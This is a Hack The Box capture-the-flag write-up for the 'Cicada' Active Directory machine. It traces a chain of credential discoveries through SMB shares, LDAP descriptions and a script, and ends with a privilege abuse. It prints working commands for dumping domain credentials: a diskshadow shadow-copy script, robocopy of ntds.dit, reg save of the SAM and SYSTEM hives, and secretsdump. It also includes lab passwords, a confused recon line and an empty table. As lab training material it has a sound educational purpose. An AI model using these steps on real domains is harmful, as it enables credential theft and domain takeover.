# HTB Cicada

> **Platform:** Hack The Box
> **OS:** Windows Server 2022 (Active Directory)
> **Domain:** `cicada.htb` — DC `CICADA-DC` (`CICADA-DC.cicada.htb`)
> **Difficulty:** Easy

## Attack Path Overview

1. **Recon** – DC; no WinRM (HTTP) but WinRM over HTTPS available? Actually port 5985 open.
2. **Guest SMB** – the `HR` share contains `Notice from HR.txt` with a default new-hire password `Cicada$M6Corpb*@Lp#nZp!8`.
3. **RID brute (guest)** – enumerate all domain users.
4. **Password spray** – the default password is still valid for **`michael.wrightson`**.
5. **LDAP description** – as `michael.wrightson`, LDAP reveals `david.orelious`'s password `aRt$Lp#7t*VQ!3` in his description field.
6. **DEV share** – as `david.orelious`, the `DEV` share contains `Backup_script.ps1` with `emily.oscars`'s cleartext password `Q!3@Lp#M6b*7t*Vt`.
7. **SeBackupPrivilege** – `emily.oscars` is in **Backup Operators**; dump SAM/SYSTEM → local Administrator hash → Pass-the-Hash. Optionally dump NTDS.dit via diskshadow for all domain hashes.

## 10. (Optional) Full Domain Dump — NTDS.dit via Diskshadow

Since this is a DC, you can also dump all domain credentials using diskshadow to create a volume shadow copy of the `C:` drive:

On Kali, create `viper.dsh`:

```bash
gedit viper.dsh
```

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

```bash
unix2dos viper.dsh
```

On the target (as emily.oscars with SeBackupPrivilege):

```powershell
cd c:\windows\tasks
upload viper.dsh
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit
reg save hklm\system c:\windows\tasks\system
reg save hklm\sam c:\windows\tasks\sam
```

Transfer back to Kali:

```powershell
download ntds.dit
download system
download sam
```

Dump everything:

```bash
impacket-secretsdump -ntds ntds.dit -system system -sam sam LOCAL
```

| Check                           | Local SAM (reg dump)  | Domain NTDS (diskshadow) |
| ------------------------------- | --------------------- | ------------------------ |

## Lessons Learned

- **HR notices and default passwords** are a real initial vector — always search SMB shares for readable documents before trying advanced attacks.
- **Credential chains**: each user unlocks the next. `guest` → HR notice → spray → `michael.wrightson` → LDAP description → `david.orelious` → DEV share script → `emily.oscars`.
- **Never put passwords in LDAP description fields** or backup scripts — both are easily enumerable.
- **Backup Operators / SeBackupPrivilege** = read any file. On a non-DC, dump SAM+SYSTEM for local admin. On a DC, also dump NTDS.dit via diskshadow for every domain account.
- **SAM dump vs NTDS dump**: SAM gives local accounts only; NTDS.dit (requires diskshadow on a DC) gives all domain credentials.
